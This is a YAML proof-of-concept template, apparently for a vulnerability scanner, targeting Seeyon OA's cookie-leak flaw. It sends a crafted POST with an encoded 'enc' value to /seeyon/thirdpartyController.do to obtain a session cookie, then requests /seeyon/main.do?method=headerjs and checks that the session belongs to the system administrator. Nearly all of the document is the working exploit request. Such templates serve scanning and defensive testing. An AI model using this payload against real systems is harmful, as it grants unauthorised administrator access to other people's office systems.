detail:
  author: Print1n(http://print1n.top)
  links:
  - https://mp.weixin.qq.com/s/0AqdfTrZUVrwTMbKEKresg
expression: r0() && r1()
manual: true
name: poc-yaml-seeyon-oa-cookie-leak
rules:
  r0:
    expression: response.status == 200 && response.headers["Set-Cookie"].contains("JSESSIONID=")
      && response.body.bcontains(b"/seeyon/common/")
    request:
      body: 'method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1

        '
      cache: true
      method: POST
      path: /seeyon/thirdpartyController.do
  r1:
    expression: "response.status == 200 && response.body.bcontains(b\"\\\"name\\\"\
      :\\\"\u7CFB\u7EDF\u7BA1\u7406\u5458\\\"\") && response.body.bcontains(b\"\\\"\
      id\\\":\\\"-7273032013234748168\\\"\")"
    request:
      cache: true
      method: GET
      path: /seeyon/main.do?method=headerjs
transport: http
